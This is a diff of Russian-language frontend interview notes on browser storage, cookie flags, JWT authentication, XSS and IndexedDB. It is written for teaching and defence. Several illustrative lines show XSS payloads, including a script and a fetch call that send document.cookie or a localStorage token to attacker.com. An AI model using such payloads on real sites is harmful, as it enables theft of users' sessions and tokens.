@@ -5,7 +5,7 @@
 ### 1. В чем разница между localStorage, sessionStorage и cookie?
 
 ```js
-// ========== localStorage ==========
+//  localStorage
 // - Хранится бессрочно, пока не удалить вручную
 // - Объем: 5-10 MB
 // - Доступен из любого JS на том же домене
@@ -24,7 +24,7 @@ const user = JSON.parse(localStorage.getItem("user"));
 localStorage.removeItem("theme");
 localStorage.clear(); // удалить всё
 
-// ========== sessionStorage ==========
+//  sessionStorage
 // - Живет до закрытия вкладки (при перезагрузке сохраняется)
 // - Объем: ~5 MB
 // - НЕ делится между вкладками
@@ -32,7 +32,7 @@ localStorage.clear(); // удалить всё
 
 sessionStorage.setItem("formData", JSON.stringify({ name: "", email: "" }));
 
-// ========== Cookies ==========
+//  Cookies
 // - Живет: сессионная (до закрытия браузера) или persistent (expires/max-age)
 // - Объем: ~4 KB на одну cookie
 // - Автоматически отправляется с каждым HTTP-запросом
@@ -111,7 +111,7 @@ document.cookie = "sessionToken=xyz; Secure; HttpOnly; SameSite=Strict; max-age=
 // XSS (Cross-Site Scripting) — внедрение вредоносного JS-кода на страницу
 // Код выполняется в браузере жертвы, может украсть данные, действовать от имени пользователя
 
-// ========== Виды XSS ==========
+//  Виды XSS
 
 // 1. Stored XSS (сохраняется в БД)
 // Злоумышленник оставляет вредоносный код в комментарии/посте
@@ -125,7 +125,7 @@ document.cookie = "sessionToken=xyz; Secure; HttpOnly; SameSite=Strict; max-age=
 // Использует манипуляции с DOM
 // Пример: element.innerHTML = userInput (где userInput содержит <script>)
 
-// ========== Чем опасны innerHTML, eval(), dangerouslySetInnerHTML ==========
+//  Чем опасны innerHTML, eval(), dangerouslySetInnerHTML
 
 // 1. innerHTML:
 const userComment = "<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>";
@@ -142,12 +142,278 @@ eval(userInput); // ОГРОМНАЯ опасность!
 // 3. dangerouslySetInnerHTML (React):
 // <div dangerouslySetInnerHTML={{__html: userInput}} /> // Опасно!
 
-// ========== Защита от XSS ==========
+//  Защита от XSS
 // 1. Экранировать/санитизировать пользовательский ввод
 // 2. Использовать textContent вместо innerHTML
 // 3. Использовать CSP (Content Security Policy) заголовки
 // 4. HttpOnly cookie для токенов
 ```
+
+---
+
+# 🍪 LocalStorage vs SessionStorage vs Cookies + Auth + XSS
+
+---
+
+## 1. В чем отличие LocalStorage, SessionStorage и Cookies?
+
+---
+
+### 🟦 LocalStorage
+
+👉 Хранилище в браузере без срока жизни
+
+### 📌 Особенности:
+
+- хранится **постоянно** (пока не удалят вручную)
+- доступен только на клиенте
+- ~5–10MB данных
+- не отправляется на сервер автоматически
+
+### 📌 Используется для:
+
+- темы сайта
+- настроек UI
+- кеша данных
+
+```js
+localStorage.setItem("theme", "dark");
+localStorage.getItem("theme");
+```
+
+---
+
+### 🟨 SessionStorage
+
+👉 То же самое, что localStorage, но сессия ограничена вкладкой
+
+### 📌 Особенности:
+
+- живёт только пока открыта вкладка
+- при закрытии вкладки — удаляется
+- не шарится между вкладками
+- не отправляется на сервер
+
+```js
+sessionStorage.setItem("token", "abc");
+```
+
+---
+
+### 🍪 Cookies
+
+👉 небольшие данные, которые **автоматически отправляются на сервер**
+
+### 📌 Особенности:
+
+- размер ~4KB
+- имеют срок жизни (expires/max-age)
+- могут быть httpOnly, secure
+- отправляются с каждым HTTP запросом
+
+```http
+Cookie: token=abc123
+```
+
+---
+
+### 📌 Главное отличие:
+
+| Хранилище      | Жизнь      | Доступ JS | Отправка на сервер |
+| -------------- | ---------- | --------- | ------------------ |
+| localStorage   | всегда     | да        | нет                |
+| sessionStorage | вкладка    | да        | нет                |
+| cookies        | по времени | да/нет    | да                 |
+
+---
+
+## 2. Флаги httpOnly и Secure
+
+---
+
+### 🔒 HttpOnly
+
+👉 cookie **недоступна из JavaScript**
+
+```text
+document.cookie ❌ не видит httpOnly cookie
+```
+
+### 📌 Защищает от:
+
+- XSS атак (кража токена через JS)
+
+---
+
+### 🔐 Secure
+
+👉 cookie отправляется **только по HTTPS**
+
+### 📌 Защищает от:
+
+- перехвата в сети (MITM)
+
+```http
+Set-Cookie: token=abc; Secure
+```
+
+---
+
+## 3. Что такое httpOnly cookie?
+
+👉 Это cookie, которую:
+
+- нельзя прочитать через JS
+- можно отправить только на сервер автоматически
+- устанавливается сервером через `Set-Cookie`
+
+---
+
+### 📌 Пример:
+
+```http
+Set-Cookie: token=abc; HttpOnly; Secure
+```
+
+---
+
+### 📌 Почему это важно:
+
+👉 фронт НЕ может украсть токен через:
+
+```js
+console.log(document.cookie) ❌
+```
+
+---
+
+## 4. Как работает JWT авторизация?
+
+---
+
+### 🔑 JWT (JSON Web Token)
+
+👉 это токен, который содержит информацию о пользователе
+
+---
+
+### 📌 Структура JWT:
+
+```
+header.payload.signature
+```
+
+---
+
+### 1. Логин:
+
+1. пользователь отправляет login/password
+2. сервер проверяет
+3. сервер генерирует JWT
+
+---
+
+### 2. Сервер возвращает токен:
+
+```json
+{
+  "accessToken": "eyJhbGciOi..."
+}
+```
+
+---
+
+### 3. Клиент хранит токен:
+
+- localStorage ❌ (уязвимо к XSS)
+- cookie httpOnly ✔ (лучше)
+
+---
+
+### 4. Запросы:
+
+```http
+Authorization: Bearer token
+```
+
+---
+
+### 5. Сервер:
+
+- проверяет подпись JWT
+- проверяет срок жизни
+- достаёт userId
+
+---
+
+### 📌 Важно:
+
+JWT — это **stateless авторизация**
+(сервер не хранит сессию)
+
+---
+
+## 5. Что такое XSS-атака?
+
+---
+
+### 💥 XSS (Cross-Site Scripting)
+
+👉 атака, при которой злоумышленник внедряет JS код на страницу
+
+---
+
+### 📌 Пример:
+
+```html
+<input value="<script>alert('hack')</script>" />
+```
+
+---
+
+### 📌 Что может сделать злоумышленник:
+
+- украсть токены (если localStorage)
+- читать DOM
+- отправлять запросы от имени пользователя
+- подменять UI
+
+---
+
+### 🔥 Типы XSS:
+
+### 1. Stored XSS
+
+- вредоносный код сохраняется в БД
+- показывается всем пользователям
+
+---
+
+### 2. Reflected XSS
+
+- код приходит через URL
+- выполняется сразу
+
+---
+
+### 3. DOM-based XSS
+
+- уязвимость в JS на фронте
+
+---
+
+## 📌 Как защититься от XSS?
+
+- использовать `httpOnly cookies` для токенов
+- экранировать input (escape HTML)
+- не использовать `innerHTML` без sanitization
+- использовать CSP (Content Security Policy)
+
+---
+
+## 📌 Короткая версия для собеседования
+
+LocalStorage и SessionStorage хранят данные на клиенте и не отправляются на сервер, cookies отправляются автоматически. HttpOnly cookie недоступна из JavaScript и защищает от XSS. JWT — это токен авторизации, который хранит данные пользователя и подписан сервером. XSS — это атака, при которой злоумышленник внедряет JS код на страницу и может украсть данные или токены.
 
 ---
 
@@ -187,14 +453,14 @@ window.addEventListener("storage", (e) => {
 ### 4. Почему нельзя хранить важную информацию в localStorage?
 
 ```js
-// ========== Проблема: доступность из JS ==========
+//  Проблема: доступность из JS
 // Любой XSS-скрипт украдет данные:
 
 // Вредоносный скрипт на странице:
 const token = localStorage.getItem("authToken");
 fetch("https://attacker.com/steal?token=" + token);
 
-// ========== Сравнение с HttpOnly cookie ==========
+//  Сравнение с HttpOnly cookie
 // localStorage:
 // - Доступен из любого JS
 // - Нет защиты от XSS
@@ -206,7 +472,7 @@ fetch("https://attacker.com/steal?token=" + token);
 // - Безопасен при XSS (скрипт не может украсть)
 // - Нужен CSRF-токен для защиты
 
-// ========== Что можно хранить в localStorage? ==========
+//  Что можно хранить в localStorage?
 // ✅ Тема оформления (dark/light)
 // ✅ Настройки UI (размер шрифта, язык)
 // ✅ Кэш нечувствительных данных
@@ -226,20 +492,20 @@ fetch("https://attacker.com/steal?token=" + token);
 ```js
 // IndexedDB — встроенная NoSQL база данных в браузере
 
-// ========== Возможности ==========
+//  Возможности
 // - Объем: большие данные (сотни MB, даже GB)
 // - Асинхронная (не блокирует UI)
 // - Хранит сложные типы: объекты, массивы, Blob, File
 // - Индексы для быстрого поиска
 // - Транзакции
 
-// ========== Когда использовать? ==========
+//  Когда использовать?
 // - Оффлайн-режим (PWA)
 // - Хранение больших данных (например, кэш видео)
 // - Сложные запросы к данным
 // - Экспорт/импорт данных
 
-// ========== Простой пример ==========
+//  Простой пример
 const request = indexedDB.open("MyDatabase", 1);
 
 request.onupgradeneeded = (event) => {
